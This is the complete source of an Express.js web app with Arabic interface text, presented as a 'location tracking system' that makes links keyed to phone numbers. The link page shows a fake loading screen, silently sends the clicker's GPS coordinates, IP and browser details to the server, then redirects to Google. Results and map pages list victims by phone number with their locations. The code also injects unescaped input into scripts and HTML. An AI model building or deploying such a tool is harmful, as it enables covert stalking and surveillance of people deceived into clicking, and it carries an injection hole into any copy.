const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// لتخزين بيانات المواقع
let locations = [];

// السماح بقراءة JSON
app.use(express.json());

// الصفحة الرئيسية - لعرض التعليمات
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>موقع تتبع المواقع الجغرافية</title>
            <style>
                body { font-family: Arial; padding: 40px; background: #f0f2f5; }
                .container { max-width: 800px; margin: auto; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
                h1 { color: #333; }
                .link-box { background: #e8f4ff; padding: 20px; border-radius: 10px; margin: 20px 0; }
                code { background: #333; color: white; padding: 10px; border-radius: 5px; display: block; margin: 10px 0; }
                a { color: #0066cc; text-decoration: none; }
                a:hover { text-decoration: underline; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🚀 نظام تتبع المواقع الجغرافية</h1>
                <p>أنشئ روابط تتبع لمعرفة موقع أي شخص يضغط عليها</p>
                
                <div class="link-box">
                    <h3>📌 كيف تستخدم:</h3>
                    <p>1. أنشئ رابط تتبع:</p>
                    <code>https://location2026-2.onrender.com/track/رقم_الهاتف</code>
                    
                    <p>2. مثال:</p>
                    <code>https://location2026-2.onrender.com/track/1234567890</code>
                    
                    <p>3. عندما يضغط الشخص على الرابط، سيتم حفظ موقعه هنا:</p>
                    <a href="/results" target="_blank">عرض جميع المواقع المسجلة</a>
                </div>
                
                <h3>📊 إحصائيات:</h3>
                <p>عدد المواقع المسجلة: <strong>${locations.length}</strong></p>
                
                <h3>🔗 رابط تجريبي:</h3>
                <a href="/track/123456" target="_blank">جرب الرابط: /track/123456</a>
            </div>
        </body>
        </html>
    `);
});

// رابط التتبع
app.get('/track/:id', (req, res) => {
    const userId = req.params.id;
    
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>جاري التحميل...</title>
            <script>
                // الحصول على الموقع الجغرافي
                function getLocation() {
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            // النجاح
                            async (position) => {
                                const lat = position.coords.latitude;
                                const lon = position.coords.longitude;
                                
                                // إرسال البيانات للخادم
                                await fetch('/save-location', {
                                    method: 'POST',
                                    headers: {
                                        'Content-Type': 'application/json',
                                    },
                                    body: JSON.stringify({
                                        id: '${userId}',
                                        latitude: lat,
                                        longitude: lon,
                                        accuracy: position.coords.accuracy,
                                        timestamp: new Date().toISOString(),
                                        userAgent: navigator.userAgent
                                    })
                                });
                                
                                // بعد 2 ثانية، التوجيه لموقع آخر
                                setTimeout(() => {
                                    window.location.href = 'https://google.com';
                                }, 2000);
                            },
                            // الفشل
                            (error) => {
                                console.error('Error:', error);
                                // حتى لو فشل، توجيه بعد فترة
                                setTimeout(() => {
                                    window.location.href = 'https://google.com';
                                }, 2000);
                            }
                        );
                    } else {
                        alert('المتصفح لا يدعم تحديد الموقع');
                        window.location.href = 'https://google.com';
                    }
                }
                
                // تشغيل عند تحميل الصفحة
                window.onload = getLocation;
            </script>
            <style>
                body {
                    font-family: Arial;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                    text-align: center;
                }
                .loader {
                    border: 5px solid #f3f3f3;
                    border-top: 5px solid #3498db;
                    border-radius: 50%;
                    width: 50px;
                    height: 50px;
                    animation: spin 2s linear infinite;
                    margin: 20px auto;
                }
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
            </style>
        </head>
        <body>
            <div>
                <h1>جاري التحميل...</h1>
                <p>يرجى الانتظار بينما يتم تحميل المحتوى</p>
                <div class="loader"></div>
                <p>سيتم توجيهك تلقائياً خلال ثوانٍ</p>
            </div>
        </body>
        </html>
    `);
});

// حفظ الموقع
app.post('/save-location', (req, res) => {
    const data = req.body;
    data.ip = req.ip || req.headers['x-forwarded-for'];
    data.time = new Date().toLocaleString('ar-SA');
    
    locations.push(data);
    
    console.log('📍 موقع جديد مسجل:', {
        id: data.id,
        location: `${data.latitude}, ${data.longitude}`,
        time: data.time
    });
    
    res.json({ success: true, message: 'تم حفظ الموقع' });
});

// صفحة النتائج
app.get('/results', (req, res) => {
    let html = `
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>النتائج المسجلة</title>
            <style>
                body { font-family: Arial; padding: 20px; background: #f5f5f5; }
                table { width: 100%; border-collapse: collapse; background: white; }
                th, td { padding: 12px; text-align: right; border-bottom: 1px solid #ddd; }
                th { background: #4CAF50; color: white; }
                tr:hover { background: #f5f5f5; }
                .map-link { color: #2196F3; text-decoration: none; }
                .map-link:hover { text-decoration: underline; }
                h1 { color: #333; }
                .refresh-btn { 
                    background: #4CAF50; 
                    color: white; 
                    border: none; 
                    padding: 10px 20px; 
                    border-radius: 5px; 
                    cursor: pointer; 
                    margin: 10px 0;
                }
            </style>
        </head>
        <body>
            <h1>📊 المواقع الجغرافية المسجلة</h1>
            <button class="refresh-btn" onclick="window.location.reload()">🔄 تحديث النتائج</button>
            <p>عدد السجلات: <strong>${locations.length}</strong></p>
            <table>
                <tr>
                    <th>رقم الهاتف</th>
                    <th>الإحداثيات</th>
                    <th>الوقت</th>
                    <th>رابط الخريطة</th>
                </tr>
    `;
    
    locations.forEach(loc => {
        html += `
            <tr>
                <td>${loc.id}</td>
                <td>${loc.latitude}, ${loc.longitude}</td>
                <td>${loc.time}</td>
                <td>
                    <a class="map-link" href="https://maps.google.com/?q=${loc.latitude},${loc.longitude}" target="_blank">
                        👁️ عرض على الخريطة
                    </a>
                </td>
            </tr>
        `;
    });
    
    html += `
            </table>
            <br>
            <a href="/">← العودة للرئيسية</a>
        </body>
        </html>
    `;
    
    res.send(html);
});

// صفحة الخريطة
app.get('/map', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>خريطة المواقع</title>
            <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
            <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
            <style>
                #map { height: 500px; width: 100%; }
                body { margin: 0; padding: 20px; }
            </style>
        </head>
        <body>
            <div id="map"></div>
            <script>
                const map = L.map('map').setView([24.7136, 46.6753], 5);
                
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    attribution: '© OpenStreetMap'
                }).addTo(map);
                
                // البيانات من الخادم
                const locations = ${JSON.stringify(locations)};
                
                locations.forEach(loc => {
                    if(loc.latitude && loc.longitude) {
                        L.marker([loc.latitude, loc.longitude])
                         .addTo(map)
                         .bindPopup('<b>رقم: ' + loc.id + '</b><br>الوقت: ' + loc.time);
                    }
                });
            </script>
        </body>
        </html>
    `);
});

// تشغيل الخادم
app.listen(PORT, () => {
    console.log(`✅ الخادم يعمل على المنفذ ${PORT}`);
    console.log(`🌐 الرابط: http://localhost:${PORT}`);
    console.log(`📌 رابط التتبع: http://localhost:${PORT}/track/123456`);
});
